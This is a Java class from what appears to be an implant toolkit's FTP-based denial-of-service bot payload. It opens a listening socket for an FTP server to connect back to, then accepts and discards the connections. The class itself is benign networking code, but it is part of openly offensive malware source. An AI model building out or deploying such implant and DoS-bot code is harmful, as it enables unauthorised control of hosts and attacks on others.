/**
 * This class is created to be the listener for the FTP server to connect back to the client and provide a response to a 
 * requested command
 * 
 * @author Solomon Sonya
 */

package Implant.Payloads.DOS_Bot.FTP_DOS_Bot;

import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;

import Implant.Driver;
import Implant.Payloads.MapNetworkInterface;

public class FTP_ServerSocket_Receive_Data extends Thread implements Runnable
{
	public static String myClassName = "FTP_ServerSocket_Receive_Data";
	
	public FTP_Object parent = null;
	
	int port = 0;//0 to indicate random (non-ephemeral) port is to be used
	int FTP_Established_Port = 0;
	
	public volatile boolean continueRun = true;
	public volatile String FTP_Server_Address = ""; 
	
	public volatile boolean FTP_ServerSocket_is_Running = false;
	
	ServerSocket svrSocket = null;
	
	Socket skt = null;
	
	
	public FTP_ServerSocket_Receive_Data(int prt, FTP_Object par)
	{
		try
		{
			parent = par;
			
			port = prt;
			
			this.start();
		}
		catch(Exception e)
		{
			Driver.eop("Constructor", myClassName, e, "", false);
		}
	}
	
	public void run()
	{
		try
		{
			//select which interface to use
			int interfaceCount = MapNetworkInterface.getInterfaceCount();
			
			//if interface count is greater than 1, choose the non-zero interface as this may be the loopback lo adapter
			InetAddress interfaceBindAddress = null;
			
			if(interfaceCount < 1)
			{
				interfaceBindAddress = null;
				Driver.sop("NOTE: FTP Inet Address may be invalid. I am unable to list Network Adapters");
			}
			else
			{
				interfaceBindAddress = MapNetworkInterface.getInterfaceAddress(1);
			}
			
			svrSocket = new ServerSocket(port, 0, interfaceBindAddress);
			

			FTP_Server_Address = svrSocket.getInetAddress().toString().substring(svrSocket.getInetAddress().toString().indexOf("/") + 1);
			//FTP_Server_Address = svrSocket.getLocalSocketAddress().toString();
			FTP_Established_Port = svrSocket.getLocalPort();
			
			FTP_ServerSocket_is_Running = true;
			
			Driver.sop("FTP serversocket established on IP: " + FTP_Server_Address + " : " + FTP_Established_Port);
			
			if(parent != null)
			{
				parent.Trigger_FTP_ServerSocket_is_Ready();
			}
			
			while(continueRun)
			{
				skt = svrSocket.accept();
				Driver.jop("NEW SOCKET RECEIVED!!!");
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("run", myClassName, e, "", false);
		}
	}
	
	public String getFTP_ServerSocket_IP_Address()
	{
		try
		{
			return FTP_Server_Address;			
		}
		catch(Exception e)
		{
			Driver.eop("getFTP_ServerSocket_IP_Address", myClassName, e, "", false);
		}
		
		return null;
	}
	
	public int getFTP_ServerSocket_PORT()
	{
		try
		{
			return FTP_Established_Port;			
		}
		catch(Exception e)
		{
			Driver.eop("getFTP_ServerSocket_PORT", myClassName, e, "", false);
		}
		
		return -1;
	}

}
